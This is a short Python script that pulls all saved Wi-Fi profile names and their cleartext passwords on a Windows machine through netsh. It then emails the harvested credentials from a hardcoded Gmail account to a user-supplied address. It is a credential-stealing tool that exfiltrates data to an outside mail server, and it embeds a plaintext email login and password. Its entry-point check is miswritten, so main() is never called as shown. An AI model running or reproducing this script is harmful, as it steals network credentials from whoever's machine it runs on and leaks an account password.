import subprocess
import re
import smtplib


def send_mail(email, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    sender_email = "penetrationwifi@gmail.com"
    password = "penetrationwifi@2021"
    server.login(sender_email, password)
    server.sendmail(sender_email, email, message)
    server.quit()


def get_wifi_networks():
    command = "netsh wlan show profiles"
    networks = str(subprocess.check_output(command, shell=True))
    network_names_list = re.findall(r"(?:Profile\s*:\s)(.*)", networks)
    network_names = [
        name.split(":")[1].strip() if ":" in name else name
        for name in network_names_list
    ]
    return network_names


def get_wifi_password(profile_name):
    command = f"netsh wlan show profile name='{profile_name}' key=clear"
    try:
        result = str(subprocess.check_output(command, shell=True))
        password = re.search(r"(?:Key Content\s*:\s)(.*)", result)
        return password.group(1) if password else "Password not found"
    except subprocess.CalledProcessError:
        return "Error retrieving password"


def main():
    network_names = get_wifi_networks()
    content = ""
    for network_name in network_names:
        password = get_wifi_password(network_name)
        content += f"Network Name: {network_name}\nPassword: {password}\n\n"

    email = input("Enter your email: ")
    send_mail(email, content)


if name == "main":
    main()
